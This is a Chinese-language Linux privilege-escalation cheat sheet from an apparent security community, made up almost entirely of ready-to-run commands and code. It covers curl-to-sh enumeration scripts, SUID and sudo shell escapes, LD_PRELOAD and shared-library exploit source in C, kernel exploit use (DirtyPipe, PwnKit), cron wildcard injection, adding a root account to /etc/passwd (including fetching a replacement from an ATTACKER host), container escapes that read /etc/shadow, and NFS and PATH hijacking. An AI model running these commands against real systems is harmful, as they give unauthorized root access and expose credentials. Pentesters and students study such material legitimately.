# Linux提权大全

> @TGSEC社区 · @TGSEC-Qtzuu 整理

## 一、自动化枚举工具

### LinPEAS
```bash
# 下载运行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 离线传输
python3 -m http.server 8888  # 攻击机
wget http://ATTACKER:8888/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh -t
```

### linux-exploit-suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### linux-smart-enumeration (lse)
```bash
curl https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -Lo lse.sh
chmod +x lse.sh && ./lse.sh -l 2
```

## 二、SUID/SGID提权

### 查找SUID文件
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

### 常见可利用SUID(GTFOBins)

```bash
# nmap(老版本)
nmap --interactive
!sh

# find
find . -exec /bin/sh -p \;

# vim
vim -c ':!sh'

# bash
bash -p

# python
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# perl
perl -e 'exec "/bin/sh";'

# ruby
ruby -e 'exec "/bin/sh"'

# awk
awk 'BEGIN {system("/bin/sh")}'

# less/more
less /etc/shadow  # 然后输入 !sh

# cp — 覆盖/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$1$salt$hash:0:0::/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd

# env
env /bin/sh -p

# strace
strace -o /dev/null /bin/sh -p

# taskset
taskset 1 /bin/sh -p

# time
time /bin/sh -p

# timeout
timeout 7d /bin/sh -p

# pkexec (CVE-2021-4034 PwnKit)
# 内存破坏,全版本通杀
```

## 三、sudo配置错误

### 检查sudo权限
```bash
sudo -l
# 看(NOPASSWD)和(ALL)条目
```

### 常见可利用sudo配置
```bash
# sudo vim
sudo vim -c ':!sh'

# sudo less
sudo less /etc/shadow
!sh

# sudo nmap
sudo nmap --interactive
!sh

# sudo find
sudo find / -exec /bin/sh \;

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo python
sudo python3 -c 'import pty;pty.spawn("/bin/sh")'

# sudo perl
sudo perl -e 'exec "/bin/sh";'

# sudo ruby
sudo ruby -e 'exec "/bin/sh"'

# sudo env
sudo env /bin/sh

# sudo ftp
sudo ftp
!sh

# sudo zip
sudo zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"

# sudo tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# sudo apache2
sudo apache2 -f /etc/shadow  # 读取文件(报错泄露内容)

# sudo mysql
sudo mysql -e '\! sh'

# sudo wget — 覆盖任意文件
sudo wget http://ATTACKER/evil_passwd -O /etc/passwd

# sudo tee — 写入任意文件
echo 'root2:$1$xyz$hash:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd

# sudo dd
echo 'root2:$1$xyz$hash:0:0::/root:/bin/bash' | sudo dd of=/etc/passwd oflag=append conv=notrunc

# LD_PRELOAD提权
# 如果sudo -l显示 env_keep+=LD_PRELOAD
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>
```

## 四、内核漏洞提权

### 信息收集
```bash
uname -a
cat /etc/os-release
cat /proc/version
```

### 主要内核漏洞

| CVE | 名称 | 影响版本 | 利用 |
|-----|------|---------|------|
| CVE-2021-4034 | PwnKit (pkexec) | 全版本polkit | `python3 pwnkit.py` |
| CVE-2022-0847 | DirtyPipe | 5.8-5.16.11 | `./dirtypipe /etc/passwd` |
| CVE-2016-5195 | DirtyCow | 2.x-4.8.3 | `./dirty /etc/passwd` |
| CVE-2021-3156 | sudo Baron Samedit | sudo<1.9.5p2 | `./exploit` |
| CVE-2022-2588 | route4 UAF | 5.x | `./exp` |
| CVE-2023-0386 | OverlayFS | 5.11-6.2 | `./fuse ./exp` |
| CVE-2023-32233 | nf_tables | 5.x-6.3 | `./exploit` |
| CVE-2024-1086 | nf_tables UAF | 5.14-6.6 | `./exploit` |

### DirtyPipe (CVE-2022-0847)
```bash
# 检测
uname -r  # 5.8 <= x <= 5.16.11

# 利用
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1  # 修改/etc/passwd获取root
```

### PwnKit (CVE-2021-4034)
```bash
# 检测
ls -la /usr/bin/pkexec
dpkg -l policykit-1 2>/dev/null

# 利用(Python版)
python3 -c '
import ctypes, sys, os
libc = ctypes.cdll.LoadLibrary("libc.so.6")
libc.execve(b"/usr/bin/pkexec", (ctypes.c_char_p * 1)(None), (ctypes.c_char_p * 2)(b"xxx", None))
'

# 编译版
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

## 五、定时任务提权

### 查找定时任务
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /var/spool/cron/crontabs/
crontab -l
cat /var/log/syslog | grep -i cron
# pspy实时监控(无需root)
./pspy64
```

### 利用方式
```bash
# 1. 可写的cron脚本
echo 'chmod u+s /bin/bash' >> /path/to/cron_script.sh

# 2. 通配符注入(tar)
# 如果cron执行: cd /dir && tar cf /tmp/backup.tar *
echo "" > "/dir/--checkpoint=1"
echo "" > "/dir/--checkpoint-action=exec=sh shell.sh"
echo "chmod u+s /bin/bash" > /dir/shell.sh

# 3. PATH劫持
# 如果cron脚本调用命令不带绝对路径
echo '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/cmd_name
chmod +x /tmp/cmd_name
# 确保/tmp在PATH前面
```

## 六、Capabilities提权

```bash
# 查找带capabilities的文件
getcap -r / 2>/dev/null

# 常见可利用capabilities
# cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search (读取任意文件)
./tar cf shadow.tar /etc/shadow
tar xf shadow.tar

# cap_net_raw (抓包)
tcpdump -i eth0 -w /tmp/cap.pcap

# cap_sys_admin (挂载)
mount -o bind /dev/sda1 /mnt
```

## 七、Docker/容器逃逸

```bash
# 检测是否在容器内
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# 用户在docker组 → 直接root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 特权容器逃逸
mkdir /tmp/escape && mount -t cgroup -o memory cgroup /tmp/escape
echo 1 > /tmp/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/escape/cgroup.procs
cat /output

# CVE-2024-21626 (runc漏洞)
# 通过/proc/self/fd/泄露host文件系统
```

## 八、NFS提权

```bash
# 查找NFS共享
showmount -e TARGET_IP
cat /etc/exports  # 看no_root_squash

# 如果配置了no_root_squash
# 在攻击机:
mkdir /tmp/nfs && mount -t nfs TARGET_IP:/share /tmp/nfs
# 以root创建SUID文件
cp /bin/bash /tmp/nfs/bash_suid
chmod u+s /tmp/nfs/bash_suid
# 在目标机:
/share/bash_suid -p
```

## 九、PATH环境变量劫持

```bash
# 如果发现SUID程序调用了不带绝对路径的命令(如"service")
strings /usr/local/bin/suid_binary  # 或ltrace/strace

# 劫持
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary  # 触发SUID → 执行/tmp/service → root shell
```

## 十、可写文件/目录提权

```bash
# 查找可写文件
find / -writable -type f 2>/dev/null | grep -v proc

# 关键可写文件
/etc/passwd          # 添加root用户
/etc/shadow          # 替换root hash
/etc/sudoers         # 添加sudo权限
/etc/crontab         # 添加定时任务
/etc/ld.so.conf.d/   # 共享库劫持

# /etc/passwd添加root用户
openssl passwd -1 -salt xyz password123
# 输出: $1$xyz$hash
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

## 十一、共享库劫持

```bash
# 查找缺失的共享库
strace /usr/local/bin/suid_binary 2>&1 | grep "No such file"

# 如果找到: open("/tmp/libcustom.so", O_RDONLY) = -1 ENOENT
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c
# 运行SUID程序触发
```
